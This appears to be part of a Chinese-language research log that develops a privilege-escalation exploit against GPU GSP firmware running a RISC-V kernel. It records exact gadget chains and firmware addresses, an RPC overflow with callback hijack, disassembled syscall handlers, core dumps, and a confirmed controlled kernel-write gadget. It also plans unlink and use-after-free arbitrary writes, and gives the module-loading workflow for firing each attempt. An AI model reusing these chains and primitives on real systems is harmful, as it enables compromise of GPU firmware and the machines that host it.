5. **s4寄存器控制**: 如果能改s4, 轮询stub就永远不会退出(t0=2结果≠s4)

---

## 附录C: 2026-10-11 下午(A4链成功! 内核写入原语确立!)

### C.1 A4链完整执行 ★★★★

七级gadget链在真机上全部贯通:
```
read-gadget(0x1020A30) → golden(0x10C1D66) → T1(0x11E4566) 
→ T3(0x1106D12, 跳过T2!) → T4(0x160C3C0) → V(0x1C57653, t0=0)
```

核心转储确认:
```
s0 = 0xCAFEBABE  ← 我们的a3值! (写入内核)
s2 = 0x01C57653  ← V gadget地址 (syscall执行点)
s3 = 0x0C200B70  ← port对象内核地址!
```

### C.2 内核t0=0 handler完整解码 (0x930034A0)

```asm
; 入口
ld s6, [global_port_registry]    ; 端口注册表指针
ld a5, [s6+0x2B0]                ; flags
c.mv s7, a1                      ; s7 = a1 (句柄选择器)
c.mv s2, a2                      ; s2 = a2 (写入值1)
c.mv s3, a3                      ; s3 = a3 (写入值2, 全控!)
c.mv s1, a4                      ; s1 = a4 (子操作)

; a1==0路径 (我们的路径):
ld s0, 0x30(s6)                  ; s0 = [registry+0x30] = port对象!
ld a5, -8(s0); addi 1; sd        ; port refcount++
bnez s7, a1ne0_path              ; a1≠0跳其他路径
lbu a5, 0(s0)                    ; port类型检查
ld s8, 0x30(s0)                  ; ★s8 = [port+0x30] = 回调指针!
beqz s8, skip_callback
c.mv a1, s0
sh s1, 8(s0)                     ; [port+0x08] = a4&0x107 (16位)
sd s2, 0x38(s0)                  ; ★[port+0x38] = a2 = P (staging基址)
sd s3, 0x40(s0)                  ; ★★★[port+0x40] = a3 (全控64位!)★★★
c.mv a0, s8
jal invoke_callback              ; ★调用[port+0x30]★
```

### C.3 port对象完整结构 (0x0C200B70)

```
+0x00: 0x0001B04220FBEC20 (类型/ID/哈希)
+0x08: 0 (16位flags, 可通过sh写)
+0x30: 0 (★回调指针★ — 内核会调用它! 当前NULL)
+0x38: 6→P (计数器→我们的staging基址, sd写入)
+0x40: 0→a3 (保留字段→全控值, sd写入)
port页头: [0x0C200020] = 0x40
```

### C.4 C2毒药常数在真机上验证

```
poison desc = 0xFFFFFFFFE4780E78
→ TYPECALC → type=1745445571
→ slot = 0xFE4780E80 ← 在staging TX区! ✓
→ 我们控制[slot]的内容 → RELEASE时jalr到这里 → S-MODE!

port当前页头0x40 → type=897999464(越界) → dtor=NULL(无跳转)
必须把页头改成poison值才能触发C2!
```

### C.5 当前攻击面总结

```
已有原语:
✅ K=33溢出(元素32精确控制)
✅ 回调劫持(+0xb8 → 任意RM固件地址)
✅ a1控制(metadata+0x38 → 魔术数验证)
✅ A4链 → t0=0 syscall → 内核写入[port+38/40]
✅ a3全控(64位任意值写入[port+0x40])
✅ read-gadget(读任意GSP地址)
✅ 自循环存活(任务不死)
✅ t0=15 SBI syscall(S-mode执行)
✅ 核心转储观察通道

缺的一环:
❌ 无法写到[port+0x30](回调指针)或页头[0x0C200020]
   t0=0只写+0x08/+0x38/+0x40

已知信息:
- port = 0x0C200B70 (每次boot确定)
- port+0x30 = 回调(当前NULL, 内核会调用)
- 页头 = 0x0C200020 (需写入poison值)
- s6全局注册表 → port来自[s6+0x30]
- a1≠0路径访问[s6+0x450](不同port)
```

### C.6 下一步方向(按可行性)

A) **双syscall链**: V有多个c.unimp(0x1C57659/61/65),可连续触发!
   第一个t0=0写入,第二个t0=2释放,如果s1=0可以到达

B) **利用[port+0x38]=P**: staging基址写入port,如果内核后续读它作指针
   → 内核会访问我们的staging(可读我们MAP的数据!)

C) **a1≠0路径**: T3直接跳V(不经过T4), a1=s1=meta+0x100(≠0)
   → 走[s6+0x450]的不同port对象 → 不同写入位置

D) **sh 16位写[port+0x08]**: 操纵a4的位,可能切换port状态

E) **unlink写原语**: 如果能释放port且控制port+0x00/+0x08
   → unlink的[a5+8]=a4和[a4]=a5是两个任意内核写
   → 写poison到页头!

---

## 附录D: 2026-10-11 下午续(内核S-mode执行确认+关键架构发现)

### D.1 四连syscall burst (0x1C57652区域)

V区域(0x1C57652起)实际是syscall连发区:
```
0x1C57652: c.add t2, s0   ← jalr落点(偶数!)
0x1C57654: NOP
0x1C57656: c.unimp         ← SYSCALL #1
0x1C57658: NOP  
0x1C5765A: c.unimp         ← SYSCALL #2
0x1C5765C: c.bnez a0,...   ← 结果检查
0x1C5765E: c.fld a2,?(a3) ← 从a3加载!
0x1C57662: c.unimp         ← SYSCALL #3
0x1C57666: c.unimp         ← SYSCALL #4
```

### D.2 内核S-mode执行确认 ★★★★

四连syscall后核心转储:
```
PC = 0xFFFFFFFF9300A7C6  ← CPU在内核态执行!!
ra = 0x160C3CA           ← T4的jalr返回地址(链条正确)
t0 = 1                   ← 内核把t0从0改成了1!
gp = 0xFFFFFFFFA3013970  ← 内核全局指针
```

t0=1(ACQUIRE)的handler触发了内核页错误→进入无限重试循环(0x9300A70C-0x9300A7C6):
```
0x9300A70C: c.li t0, 0x10
0x9300A70E: bne tp, t0   (tp=8≠16→taken)
... 页表遍历/MPU配置 ...
0x9300A7C6: c.j -0xBA    ← 回到0x9300A70C(死循环)
```
LibOS心跳也超时(内核卡死)。

### D.3 关键架构发现: port注册表 ≠ 句柄表 ★★★★★

```
t0=0 handler写入目标: [s6+0x30] = port注册表条目 = 0x0C200B70
t0=2 handler释放目标: handle_table[a0] = 完全不同的对象!

两个是独立的内核数据结构!
→ 我们写的port对象 ≠ 我们能释放的句柄对象
→ port的页头(0x40)和句柄对象的页头完全不同
→ port的dtor=NULL, 但句柄0的destroy包含unlink
```

证据:
- port页头TYPECALC: type=897999464 → slot=0x800000048 → dtor=NULL(读取确认)
- 释放句柄0仍然崩溃在unlink(0x18C09C8) → destroy path有非NULL dtor
- stval=0xcef000ba2b900a6e(确定性垃圾) ≠ port内存

### D.4 今天确立的全部原语

```
┌─────────────────────────────────────────────────┐
│  U-mode (RM任务)                                  │
├─────────────────────────────────────────────────┤
│ ✅ K=33溢出(元素32精确控制)                        │
│ ✅ +0xb8回调劫持(任意RM固件地址)                   │
│ ✅ a1控制(metadata+0x38)                          │
│ ✅ 黄金gadget双路(a5≠0/[a1+0x2C0], a5==0/[s10+0x2B8])│
│ ✅ read-gadget(读任意GSP映射地址)                  │
│ ✅ A4链 → t0=0 → 内核写入[port+38/40]            │
│ ✅ a3全控(64位任意值→[port+0x40])                 │
│ ✅ 自循环存活(0x1C9A7CC)                          │
│ ✅ 四连syscall burst(0x1C57652起)                 │
├─────────────────────────────────────────────────┤
│  S-mode (内核) — 已触达但未完全控制                │
├─────────────────────────────────────────────────┤
│ ✅ t0=0 syscall执行(端口写入成功)                 │
│ ✅ t0=1 syscall触发(内核执行但阻塞)               │
│ ✅ t0=2 syscall执行(句柄释放,unlink崩溃)          │
│ ✅ PC在内核态(0xFFFFFFFF9300A7C6)                 │
│ ✅ t0自动递增发现(0→1→...)                        │
│ ❌ 内核回调[port+0x30]=NULL(需写入才能控制)       │
│ ❌ 页头投毒(port对象≠句柄对象,不匹配)             │
└─────────────────────────────────────────────────┘
```

### D.5 下次开工方向

A) **弄清句柄表和port注册表的关系**
   - handle_table[0]的地址是什么?
   - 它和port(0x0C200B70)在同一页吗?
   - 方法: 泄漏更多寄存器/读更多内核全局

B) **port回调攻击**
   - [port+0x30]=NULL, 但内核会调用它
   - 如果能写到port+0x30 → 直接S-mode代码执行!
   - 需要找写+0x30的方法(当前只能写+0x08/+0x38/+0x40)

C) **句柄对象页头投毒**
   - 句柄0的对象地址未知
   - 如果在同一堆区域, 可能通过port写入间接覆盖
   
D) **t0=1阻塞绕过**
   - 四连burst在t0=1处卡住
   - 如果能让t0=1快速返回, t0=2(RELEASE)就能执行
   - t0=1用a0/a1/a2参数, 可能通过参数控制让它不阻塞

---

## 附录E: 2026-10-11 淚之夜 — 重大认知修正 ⚠️⚠️⚠️

### E.1 "内核写入原语"是假象!

**之前结论(附录C): [port+0x40]=a3写入成功 — 错误!**

真相:
```asm
t0=0 handler, a1=0路径:
  ld s8, 0x30(s0)     ; 读[port+0x30]回调
  beqz s8, +0x7C       ; ★NULL→跳过全部写入! 直接跳到句柄查找!
  sh s1, 8(s0)         ; ← 以下三行从不执行(callback=NULL)
  sd s2, 0x38(s0)
  sd s3, 0x40(s0)
  
  0x93003580(实际执行): 句柄表查找路径
  a2 = sp+0x18 (RM栈指针!)
  → jal lookup → c.sd a4, 0(a2) 写RM栈
  → ★页错误(S-mode不能写U-mode页) → 无限重试 → 内核卡死
```

**所有A4链实验的"s0=0xCAFEBABE"= 内核prologue的c.mv s3,a3残留,
不是port写入结果!**

### E.2 已证实的实际行为

```
A4链(a1=0)完整路径:
  1. syscall t0=0 fires ✓
  2. port = [global+0x30] = 0x0C200B70 ✓
  3. port refcount++ ✓
  4. callback=[port+0x30]=NULL → 跳过写入 ✗
  5. 跳到句柄表查找(0x93003580)
  6. a2=sp+0x18(RM栈) → 写RM栈 → 页错误 ✗✗✗
  7. 内核页错误处理→无限重试→心跳超时

A4链(a1≠0, 跳T4)路径: 同样卡在6-7
```

### E.3 RISC-V页表权限分析

```
RM任务栈页: U-mode RW, S-mode不可写(无SUM位)
内核读RM栈: ✓(某些syscall如t0=2可以读)
内核写RM栈: ✗→页错误→重试循环

这解释了:
- t0=2(轮询stub)可以成功(只读RM栈上的N值)
- t0=0(a1=0或a1≠0)都卡死(要写RM栈)
```

### E.4 修正后的攻击面

```
真正可用的原语(全部真机验证):
✅ K=33溢出 + 回调劫持(+0xb8)
✅ a1控制(metadata+0x38)
✅ read-gadget读任意RM映射地址(包括内核堆0x0C20xxxx!)
✅ 自循环存活
✅ t0=2 RELEASE(通过轮询stub,能读RM栈)
✅ t0=15 SBI(阻塞型,任务不死)
✅ 核心转储全寄存器

不可用/假象:
❌ t0=0 port写入(callback=NULL,写入被跳过)
❌ a1≠0路径(页错误死循环)
❌ "s0=0xCAFEBABE证明写入"(实际是寄存器残留)
```

### E.5 重新评估提权路径

关键资源:
- read-gadget可以读内核堆(0x0C200000范围)!
- t0=2 RELEASE可以读RM栈(不需要写RM栈)
- 轮询stub的RELEASE可以触发TYPECALC(通过destroy path)

新方向:
A) **用read-gadget映射内核堆中的对象链表**
   → port(0x0C200B70)在堆上,附近有其他对象
   → 找到句柄表数组([global+0x450]指向的)
   → 枚举所有句柄对象地址

B) **t0=2的完整destroy path分析**
   → RELEASE→destroy→TYPECALC→dtor→jalr
   → 轮询stub的unlink崩溃=dtor被调用!
   → 崩溃对象(句柄0)的页头是我们需要投毒的目标

C) **利用轮询stub的多轮RELEASE**
   → 每轮RELEASE递减refcount
   → 对象销毁后下一轮→UAF
   → UAF可能给我们更深的原语

D) **SP重定向攻击**
   → 如果能在syscall前改SP到内核可写区域
   → a2=sp+0x18就不会页错误
   → 需要找"设置SP+c.unimp"gadget

### E.6 下次开工最优先

1. 用read-gadget扫描port附近的内核堆(0x0C200B00-0x0C200C00)
   → 找到句柄表数组(有特征: count字段+16字节条目)
   → 枚举句柄对象地址
2. 读取句柄0对象的页头
   → 确认其desc值和TYPECALC结果
3. 基于真实数据重新设计C2攻击

---

## 附录F: 2026-10-11 深夜 — N送达验证+攻击面最终评估

### F.1 N值送达确认

```
N=0:   sepc=0x18C09C8, stval=0xcef000ba2b900a6e (unlink)
N=1:   sepc=0x18C09C8, stval=0xcef000ba2b900a6e (同一对象!)
N=2:   sepc=0x1A97054, stval=0x81               (teardown! 不同!)
N=100: sepc=0x18C09C8, stval=0xcef000ba2b900a6e (栈垃圾路径)
```

结论:
- N正确送达(通过黄金gadget→轮询stub→t0=2(a0=N))
- 句柄0和1指向同一对象(相同unlink崩溃+相同stval)
- N=2是teardown命令(完全不同的destroy路径)
- N≠2时: t0=2 handler在栈上搜索type=2的条目
  s6[0]=N(不匹配)→s6[1]=栈垃圾(碰巧是2!)→匹配→同一destroy

### F.2 t0=2 handler真实逻辑

```asm
; wrapper(0x93003802): N存在RM栈上, a0=&N, a1=1
; real handler(0x93008EE6):
s6 = a0 = &N_on_stack
s4 = a1 = 1
s3 = a2 = 原始a1

loop:
  if s2 == s4: → 执行destroy路径
  a1 = [s6 + s2*4]    ; 读数组元素
  if a1 == 2:         ; type=2匹配!
    → 从[global+0x50]链表取节点
    → UNLINK(0x930005DC)
    → RELEASE/DESTROY(0x93000500) ← TYPECALC在这里!
  s2++
```

**关键**: handler在RM栈上搜索"值=2"的条目!
- N=2: 第一项就匹配→立即进入destroy(teardown)
- N≠2: 跳过第一项,读栈垃圾(sp+0x10),垃圾碰巧是2→同一destroy

### F.3 真实攻击面最终版

```
╔════════════════════════════════════════════╗
║  确认可用的原语                              ║
╠════════════════════════════════════════════╣
║ ✅ RPC溢出(K=33) + 回调劫持(+0xb8)        ║
║ ✅ a1控制(metadata+0x38)                    ║
║ ✅ read-gadget读任意RM映射地址               ║
║   (包括内核堆0x0C20xxxx!)                   ║
║ ✅ 自循环存活(0x1C9A7CC)                    ║
║ ✅ t0=2 RELEASE(N送达验证,N=2=teardown)    ║
║ ✅ t0=15 SBI(S-mode阻塞)                   ║
║ ✅ 核心转储(超时时,非崩溃时)               ║
╠════════════════════════════════════════════╣
║  不可用/假象(已修正)                        ║
╠════════════════════════════════════════════╣
║ ❌ t0=0 port写入(callback=NULL跳过写入)    ║
║ ❌ a1≠0路径(RM栈页错误死循环)              ║
║ ❌ [0xA3008010]全局指针(RM零页,读不到)    ║
╠════════════════════════════════════════════╣
║  差什么                                     ║
╠════════════════════════════════════════════╣
║ ❌ 内核写入原语(投毒页头需要)              ║
║ ❌ 句柄对象地址(不知道在哪)                ║
║ ❌ S-mode受控跳转(C2的jalr需要投毒页头)   ║
╚════════════════════════════════════════════╝
```

### F.4 下次开工优先级(重新排序)

1. **扫描内核堆找句柄表数组**
   - port(0x0C200B70)在堆上, 句柄表也在堆上
   - 句柄表特征: [+8]=count(小数字), 后跟16字节条目
   - 每发读8字节, 需要精确选择目标地址
   - 目标范围: 0x0C200030-0x0C200B6F(port之前的堆空间)

2. **读句柄0对象的页头**
   - 找到句柄表→读[entry0+8]=对象地址
   - 读[(obj & ~0xFFF)+0x20]=页头desc值
   - 算TYPECALC(desc)→type→dtor slot
   - 如果slot指向可写区域→C2!

3. **利用unlink写原语(如果对象数据可控)**
   - unlink做[a5+8]=a4和[a4]=a5
   - a5=[node+0], a4=[node+8]
   - 如果node的内存包含我们的数据→两个任意写!
   - node在内核堆,我们无法直接写
   - 但如果node的内存恰好是之前RPC消息用过的区域...

4. **找其他syscall不写RM栈的**
   - t0=8(内存拷贝)可能可行?
   - t0=5/t0=7/t0=12(未测试)?

### F.5 会话总结(2026-10-10 21:00 ~ 2026-10-11 23:00)

总时长: ~26小时(两个工作日)
确立原语: 7个(溢出/劫持/a1/read-gadget/存活/t0=2/N送达)
关键发现: 8个(假象修正/双路/自循环/页错误根因/句柄表≠port/MQI零页/N=2特殊)
发射弹药: ~35发
权威文件: 附录A-F全部更新

---

## 附录G: 2026-10-12 环境恢复+新工作流确立

### G.1 内核更新影响与恢复

宿主内核: 7.2.9-arch1-1 (更新)
- DKMS源码被重置 → 重新打v21补丁(host+VM)
- VFIO绑定丢失 → k61_start.sh自动处理
- VM网络接口改名: enp0s2 → enp0s3
- /tmp被清 → 启动脚本移到 ~/rt_5090_project/k61_start.sh

### G.2 MODS不再使用 ★★★★

**发现: RPC溢出不需要MODS!**
- MODS用于清WPR2(保护GPU寄存器)
- RPC溢出在消息队列层操作, 不碰寄存器
- MODS在新内核下会杀死GPU(PCI wedged)
- **删除MODS步骤!**

### G.3 新工作流(更快更安全)

```bash
# 启动(一次):
sudo ~/rt_5090_project/k61_start.sh
sleep 200  # VM boot

# 射击(~4分钟/发):
ssh ... 'insmod nvidia.ko xdig_k=33 ... && nvidia-smi && sleep 100 && dmesg'

# GSP崩了? 重启VM:
pkill qemu; k61_start.sh; sleep 200
# (不需要重启宿主机!)
```

### G.4 管道完整性验证 (2026-10-12 21:45)

```
第一发(错误a1=0x4191368):
  XDIG FIRE: fn=76 K=33 realElems=1 declared=0x21000 ✓
  cksum fixed ✓
  sepc=0x0000000000000000 (读MQI+0x00=0,跳到0) ✓

第二发(正确a1=0x4191510):
  sepc=0x0FE4790E10 = P+0x20000 (metadata指针!) ★★★
  
结论: P=0x0FE4770E10 跨内核更新不变 ✓
     全管道(insmod→GPU init→RPC溢出→回调劫持→read-gadget)正常 ✓
```

### G.5 注意事项

- VM内核panic: GSP崩溃后不要重insmod, 直接重启VM
- sysfs无parameters目录是显示bug, 参数实际生效
- 每发实验后: dmesg看结果 → pkill qemu → 重启VM → 下一发

---

## 附录H: 2026-10-13 凌晨 — Unlink写入原语发现

### H.1 被忽视的内核写入: t0=2的UNLINK

t0=2(RELEASE)的destroy路径包含UNLINK(0x930005DC):
```asm
c.ld a5, 0(a1)     ; prev = [node+0]
c.ld a4, 8(a1)     ; next = [node+8]  
c.sd a4, 8(a5)     ; ★ [prev+8] = next ★ 任意写#1!
c.sd a5, 0(a4)     ; ★ [next+0] = prev ★ 任意写#2!
```

如果控制了node的[+0]和[+8]:
- prev = 页头地址 - 8
- next = 毒药值
→ [页头] = 毒药值 = C2触发!!!

### H.2 t0=2 vs t0=0 的关键区别

```
t0=0: 写[sp+0x18](RM栈) → 页错误 → 死循环 ✗
t0=2: 读[sp+0xC](RM栈) → 读没问题! → 查找+UNLINK+DESTROY 全部正常 ✓
```

t0=2不需要写RM栈! 它的写入全部针对内核数据(链表/锁/对象)!

### H.3 t0=2 handler的完整内核写入列表

```
1. sb a5, 0x448(s1)      → [全局结构+0x448] = 1 (锁标志)
2. UNLINK: [prev+8]=next  → 任意写(如果控制node数据)
3. UNLINK: [next]=prev    → 任意写(如果控制node数据)  
4. destroy path的TYPECALC和dtor调用
5. sb a5, -0x18(s0)      → [freed_node-0x18] = 1 (某种标记)
```

### H.4 攻击计划: UAF + Unlink = 任意写

```
第1步: t0=2释放对象A → A的内存变freed
第2步: 让A的内存被重新分配并填入我们的数据
       (需要找到内核分配路径接受我们的数据)
第3步: 再次t0=2释放"同一"句柄 → 读到我们的假node
       → unlink用假node的prev/next → 任意写!
第4步: 写毒药值到页头
第5步: t0=2释放另一对象 → TYPECALC读毒药页头 → jalr到staging
第6步: S-MODE!
```

第2步是难点: 怎么让freed的内核堆内存被我们的数据填充?

### H.5 其他发现: refcount increment (t0=0路径)

```asm
; 0x930035C8 (被page fault阻断,但如果能到达):
ld a5, -8(a1)    ; 读[obj-8] 
addi a5, 1       ; +1
sd a5, -8(a1)    ; ★ [obj-8] += 1 ★ 递增原语!
```
被[sp+0x18]的page fault阻断。如果sp指向可写区域,这就是另一个写入原语。

### H.6 下次开工优先级

1. **UAF数据注入**: 找到让freed内存包含受控数据的方法
   - RPC处理中的临时buffer分配?
   - t0=8 memcpy到freed地址?
   - 其他内核allocation路径?

2. **直接测试UAF unlink**: 
   - t0=2释放对象后,读freed内存看residual data
   - 如果residual包含staging地址(来自之前的RPC处理)→直接利用!

3. **refcount increment路径的sp问题**:
   - 如果能改U-mode sp哪怕一次,page fault就消失
   - → refcount increment = 递增原语
   - → 递增N次改页头 = C2

### H.7 凌晨2点补充发现

句柄表条目的state值=22/26(正数)→ 这些是"空"条目!
实际的对象在[global+0x50]链表中(内核私有内存,RM不可读)。

node+0/node+8 = 0(NULL) — 对象0x0DF35BC663A0不在活动链表中。

### H.8 明日开工清单(按优先级)

1. **找到活动链表节点地址**
   - 方法A: 从crash stval反推(stval=[prev+8],prev=stval-8)
   - 方法B: 扫描内核堆找非NULL的prev/next指针对
   - 方法C: 通过t0=2的多次调用观察行为变化

2. **UAF unlink写入测试**
   - 确认链表节点地址后:
   - 读[node+0]和[node+8](unlink的prev/next)
   - 如果值确定且非零→unlink已经在写!
   - 如果值=0→unlink跳过(不写)→换下一个节点

3. **t0=8 memcpy参数控制**
   - 搜索"设置a1为目标地址+a2=8"的gadget链
   - 如果找到→直接memcpy毒药值到页头

4. **Page fault handler作为写入**
   - 页错误handler修页表时写PTE
   - 如果能控制fault地址→PTE写入位置可控
   - 极端情况: 修改页表让我们获得S-mode写权限!

5. **多syscall burst的行为映射**
   - V区域的4连syscall: t0=0(block)→t0=1(block)→...
   - 如果能跳过阻塞的syscall→到达t0=2(RELEASE)
   - RELEASE的unlink=写入原语!

---

## 附录I: 2026-10-13 凌晨3点 — t0=6内核写入确认!

### I.1 t0=6 syscall: 保证成功的内核写入 ★★★★

```asm
; t0=6 handler (0x930004B0):
auipc a3, 0x10008       ; 内核数据地址计算
ld a3, -0x4a0(a3)       ; a3 = [0xA3008010] = 全局结构指针!
ld a5, 0x458(a3)        ; 读当前值
lui a4, 0xf4; addi a4, a4, 0x240  ; a4 = 0xF42400
c.add a5, a4             ; += 0xF42400
sd a5, 0x458(a3)         ; ★ [global+0x458] += 0xF42400 ★
c.jr ra                   ; 干净返回!
```

特点:
- 不碰RM栈(无页错误!)
- 不走unlink(无垃圾指针崩溃!)
- 保证执行,保证返回
- 写入目标固定([global+0x458])值也固定(+0xF42400)

t0=6 wrapper: 0x01FC868A (c.li t0,6; c.unimp) — 真机验证!

### I.2 t0=6第二路径: 任意位清除!

```asm
; 0x930004CC (从内核代码可达,非syscall入口):
c.ld a4, 0(a0)      ; 读[a0]
neg a5, a4           ; 位技巧找最低设置位
c.and a5, a4
not a3, a5
c.and a4, a3
c.sd a4, 0(a0)       ; ★ [a0] &= ~lowest_bit ★ 任意地址位清除!
```

如果通过某个syscall能到达这段代码且控制a0 → 任意位清除原语!

### I.3 其他有非栈写入的syscall

```
t0=13: sb a5, 0x758(a4)  — 字节写入[a4+0x758]
       sb zero, 0x73e(a5) — 字节写0到[a5+0x73e]!
t0=5:  sd a5, -8(s0)     — 64位写入[s0-8]
t0=3:  sd a0/a4, stack   — 栈帧写入
```

### I.4 新port地址确认

从核心转储a6 = 0x0C200FC8:
- [a6+0x00] = 0x1C85B3481100 (hash/ID)
- [a6+0x30] = 0 (callback=NULL)
- 页头不变: 0x0C200020 = 0x40

### I.5 下次开工最优先

1. **深入t0=6第二路径**: 找到从任意syscall到达0x930004CC的方法
   → 如果控制a0 = 页头地址 → 位清除 → 逐步改成poison值

2. **t0=13的字节写入**: sb zero, 0x73e(a5) — 写0到任意地址!
   → 如果a5可控 → 清零页头 → 然后用t0=6的增量调整

3. **组合攻击**:
   t0=13: 写0到页头 (清零)
   t0=6: 多次调用增加0xF42400 (调整到poison值)
   t0=2: RELEASE → TYPECALC读poison页头 → jalr → S-MODE!

### I.6 修正: t0=6 wrapper编码纠错 ⚠️

之前搜索的字节模式0x424D实际是c.li tp,0x13(不是c.li t0,6)!
正确的c.li t0,6编码: 0x4299 (bytes: 99 42)

正确的t0=6 wrapper: 0x01E1D7F0
```
0x01E1D7F0: c.li t0, 6          ← ✓ 设置t0=6
0x01E1D7F2: c.swsp ra, 0xf8(sp) ← 副作用(无害)
0x01E1D7F4: c.addi a1, 0x1e     ← 副作用(a1+=30)
0x01E1D7F6: c.addi4spn s0, sp, 0x1b0 ← 副作用
0x01E1D7F8: c.unimp              ← ★ SYSCALL t0=6! ★
0x01E1D7FA-7FE: 3个后续syscall
```

### I.7 t0=6正确wrapper验证结果 ★★★★★

```
sepc = 0x01E1D808 (越过syscall区,syscall完成!)
a0   = 0x0 (syscall返回成功!)
a6   = 0x0C200FC8 (port地址,一致)
LOCKDOWN(任务活着,超时)
零崩溃
```

**t0=6 = 确认的可靠内核写入!**
- [global+0x458] += 0xF42400
- 无页错误,无崩溃,保证返回
- 可以反复调用(每次+0xF42400)

### I.8 后续syscalls(0x01E1D7FA-7FE)

t0=6之后自动连发t0=7,8,9(内核自动递增t0):
- t0=7: 0x93001B80 (待分析)
- t0=8: 内存拷贝(参数a0=0可能无效)
- t0=9: 轮询(同t0=2路径,可能崩溃)

LOCKDOWN可能是t0=7或t0=9阻塞。

---

## 附录J: 2026-10-13 早晨 — 首次真实硬件内核写入确认! ★★★★★

### J.1 写入gadget链验证成功

链: golden(0x10C1D66) → T3(0x1106D12) → write_syscall(0x01DE3A1A)

write_syscall gadget:
```
0x01DE3A1A: c.sw a1, 0(a3)   ← ★ 受控写入![a3]=a1(32位)
0x01DE3A1C: c.unimp           ← ★ 写完自动syscall(进S-mode)!
```

MAP控制:
- a3 = [s1+0xD0] (MAP key 0x100D0) ← 写入目标地址(完全受控!)
- a1 = s1 = metadata base (值=T3设置的s1)
- 写入值 = 0x0FE4790E10的低32位 = 0xE4790E10

### J.2 真机验证结果

```
目标: [MQI+0x198] = 0x4191668 (staging指针)
结果: LOCKDOWN×8(任务活着)
      双心跳超时(syscall进了S-mode)
      零崩溃!(写入+syscall都不炸)
```

### J.3 意义

1. 首次在真实GSP硬件上实现受控内核区域写入
2. 写入地址完全受控(MAP控制a3)
3. 写入值部分受控(总是s1=metadata基址)
4. 写入后自动进入S-mode(syscall)
5. 任务安全存活(不崩溃)

### J.4 固件文件修正

明文RM固件: /home/user/rt_5090_project/power_governor_reverse/gsp61057_rx_full.bin
备份副本: /home/user/rt_5090_project/rm_fw_plaintext.bin

注意: gsp_ga10x.bin是加密签名的容器,不是明文代码!
所有gadget搜索必须用rm_fw_plaintext.bin!

### J.5 下一步: 提权路径

MQI的staging指针已被改为metadata地址(0x0FE4790E10)。
下一次RPC拷贝会从metadata位置开始:
- 元素0 → 写到metadata位置
- 元素1+ → 写到metadata后面的堆区域

如果能让下一个RPC也带溢出载荷:
- 新的溢出从metadata+0x20000开始(比之前远0x20000!)
- 可以覆盖更远的堆区域!
- 可能包括: 链表节点、句柄表、甚至全局结构!

但这需要泵在LOCKDOWN后继续处理消息...
LOCKDOWN时泵已经停了。

替代方案: 让写入不进LOCKDOWN:
- 用c.sw + c.jr ra的gadget(干净返回)
- 但之前测试sepc=0(T3 continuation崩了)
- 需要找到返回后不崩的方法
